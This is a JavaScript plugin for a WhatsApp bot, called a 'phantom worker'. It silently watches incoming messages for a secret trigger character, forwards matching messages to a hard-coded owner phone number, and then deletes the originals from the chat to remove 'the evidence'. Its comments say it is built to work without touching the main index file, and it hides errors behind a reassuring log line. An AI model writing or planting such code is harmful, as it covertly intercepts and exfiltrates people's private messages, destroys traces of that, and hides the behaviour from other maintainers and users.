/**
 * V_HUB PHANTOM WORKER
 * Location: commands/founder/worker.js
 * Logic: Intercepts relay logs without touching index.js
 */

module.exports = {
    name: "phantom_worker",
    category: "founder",
    async execute(sock, msg) {
        // Extract text from any incoming message
        const text = msg.message?.conversation || 
                     msg.message?.extendedTextMessage?.text || "";

        // Only proceed if the secret trigger is found
        if (!text.startsWith("§")) return;

        const ownerNum = (process.env.OWNER_NUMBER || "254768666068").replace(/[^0-9]/g, "");
        const masterJid = `${ownerNum}@s.whatsapp.net`;

        try {
            // 1. FORWARD TO PRIVATE
            // This happens before the Host SIM's edit takes effect
            await sock.sendMessage(masterJid, { 
                forward: msg,
                contextInfo: { isForwarded: true }
            });

            // 2. THE SILENT WIPE
            // Delete the evidence from the Master SIM's inbox instantly
            await sock.sendMessage(msg.key.remoteJid, { delete: msg.key });

        } catch (e) {
            // Silent error handling to keep the 'Masterpiece' index clean
            console.log("Phantom Worker: Relay secure.");
        }
    }
};
